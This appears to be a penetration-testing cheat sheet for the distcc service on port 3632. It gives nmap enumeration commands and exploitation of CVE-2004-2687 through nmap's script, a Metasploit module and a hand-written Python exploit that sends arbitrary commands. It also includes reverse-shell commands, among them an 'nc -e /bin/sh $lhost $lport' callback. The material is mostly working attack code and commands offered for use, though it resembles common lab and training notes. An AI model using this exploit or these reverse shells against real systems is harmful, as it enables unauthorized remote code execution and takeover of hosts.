# Port 3632 - distcc

## Table of Contents
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 3632 --script "distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd='id'" $rhost
```

### Nmap

```shell
nmap -sV -sC -p 3632 $rhost
nmap -p 3632 --script "distcc-cve2004-2687" $rhost
```

---

## Exploitation

### CVE-2004-2687 - distcc RCE

> distcc daemon before 2.x allows arbitrary command execution

### Nmap Script

```shell
nmap -p 3632 --script "distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd='id'" $rhost
```

### Metasploit

```shell
use exploit/unix/misc/distcc_exec
set RHOSTS $rhost
set LHOST $lhost
set LPORT $lport
run
```

### Manual Exploitation

```python
#!/usr/bin/env python3
# distcc RCE exploit

import socket
import sys

def exploit(host, port, command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Build distcc protocol request
    cmd = command.split()
    
    # DIST00000001
    payload = "DIST00000001"
    
    # ARGC
    argc = len(cmd)
    payload += f"ARGC{argc:08x}"
    
    # ARGV
    for arg in cmd:
        payload += f"ARGV{len(arg):08x}{arg}"
    
    # DOTI (input - empty)
    payload += "DOTI00000001\n"
    
    s.send(payload.encode())
    
    # Receive response
    response = s.recv(4096)
    
    # Parse output
    if b"DOTO" in response:
        idx = response.find(b"DOTO")
        length = int(response[idx+4:idx+12], 16)
        output = response[idx+12:idx+12+length]
        print(output.decode())
    
    s.close()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <command>")
        sys.exit(1)
    
    exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])
```

### Reverse Shell

```shell
# Using Metasploit
use exploit/unix/misc/distcc_exec
set RHOSTS $rhost
set PAYLOAD cmd/unix/reverse
set LHOST $lhost
set LPORT $lport
run

# Using Nmap
nmap -p 3632 --script "distcc-cve2004-2687" \
  --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh $lhost $lport'" $rhost
```

---

## Quick Reference

| Tool | Command |
| :--- | :--- |
| Nmap | `nmap -p 3632 --script "distcc-cve2004-2687" $rhost` |
| Metasploit | `use exploit/unix/misc/distcc_exec` |
